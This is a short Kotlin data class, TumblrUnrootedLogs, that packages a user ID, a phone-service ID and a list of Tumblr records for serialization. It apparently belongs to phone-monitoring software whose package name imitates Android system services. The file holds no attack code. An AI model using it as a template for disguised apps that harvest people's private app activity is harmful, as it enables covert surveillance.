package com.android.services.models

import com.android.services.db.entities.TumblrUnrooted
import com.google.gson.annotations.SerializedName

class TumblrUnrootedLogs {
    @SerializedName("userId")
    var userId: String? = null
        private set

    @SerializedName("phoneServiceId")
    var phoneServiceId: String? = null
        private set

    @SerializedName("data")
    var tumblrUnrootedList: List<TumblrUnrooted>? = null
        private set

    constructor()
    constructor(
        userId: String?,
        phoneServiceId: String?,
        tumblrUnrootedList: List<TumblrUnrooted>?
    ) {
        this.userId = userId
        this.phoneServiceId = phoneServiceId
        this.tumblrUnrootedList = tumblrUnrootedList
    }
}